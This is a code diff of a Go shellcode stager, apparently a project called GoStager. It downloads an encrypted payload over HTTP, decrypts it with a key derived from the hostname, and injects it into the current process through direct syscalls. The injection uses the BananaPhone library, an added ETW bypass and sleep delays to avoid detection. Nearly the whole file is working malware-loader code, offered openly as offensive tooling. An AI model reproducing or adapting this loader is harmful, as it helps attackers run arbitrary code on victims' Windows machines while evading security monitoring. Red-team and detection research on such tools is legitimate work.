@@ -1,16 +1,18 @@
 package main
 
 import (
+	"GoStager/cmd/cryptoUtil"
+	"GoStager/cmd/malwareUtil"
 	"GoStager/cmd/util"
 	_ "embed"
 	b64 "encoding/base64"
 	"encoding/hex"
 	"fmt"
+	"golang.org/x/sys/windows"
 	"io/ioutil"
 	"net/http"
 	"strconv"
 	"strings"
-	"syscall"
 	"time"
 	"unsafe"
 
@@ -21,11 +23,11 @@ import (
 var t string
 var (
 	body       []byte
-	initChecks util.InitChecks
+	initChecks util.InitialChecks
 )
 
 // example of using bananaphone to execute shellcode in the current thread.
-// hell's gate
+// https://github.com/C-Sto/BananaPhone
 
 func main() {
 	//get the shellcode by http
@@ -45,8 +47,8 @@ func main() {
 		sleep(t)
 		body = request("", conf)
 	}
-	key := util.GenerateKey(initChecks.Hostname, 32)
-	hexSc, _ := util.DecodeAES(body, []byte(key))
+	key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
+	hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
 	shellcode, _ := hex.DecodeString(string(hexSc))
 	//inject the shellcode
 	inject(shellcode)
@@ -70,6 +72,7 @@ func request(cookie string, conf []string) []byte {
 }
 
 func inject(shellcode []byte) {
+	//from https://github.com/C-Sto/BananaPhone/blob/master/example/calcshellcode/main.go
 	bp, _ := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
 	//resolve the functions and extract the syscalls
 	alloc, _ := bp.GetSysID("NtAllocateVirtualMemory")
@@ -80,13 +83,7 @@ func inject(shellcode []byte) {
 }
 
 func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {
-
-	const (
-		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
-		memCommit  = uintptr(0x00001000)
-		memreserve = uintptr(0x00002000)
-	)
-
+	malwareUtil.Etw(handle) //etw bypass
 	var baseA uintptr
 	regionsize := uintptr(len(shellcode))
 	bananaphone.Syscall(
@@ -95,8 +92,8 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		uintptr(unsafe.Pointer(&baseA)),
 		0,
 		uintptr(unsafe.Pointer(&regionsize)),
-		uintptr(memCommit|memreserve),
-		syscall.PAGE_READWRITE,
+		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
+		windows.PAGE_READWRITE,
 	)
 	sleep(5)
 	//write memory
@@ -108,7 +105,7 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		handle,
 		uintptr(unsafe.Pointer(&baseA)),
 		uintptr(unsafe.Pointer(&regionsize)),
-		syscall.PAGE_EXECUTE_READ,
+		windows.PAGE_EXECUTE_READ,
 		uintptr(unsafe.Pointer(&oldprotect)),
 	)
 	sleep(5)
@@ -128,5 +125,5 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		0,                                    //lpbytesbuffer
 	)
 	sleep(5)
-	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
+	windows.WaitForSingleObject(windows.Handle(hhosthread), 0xffffffff)
 }
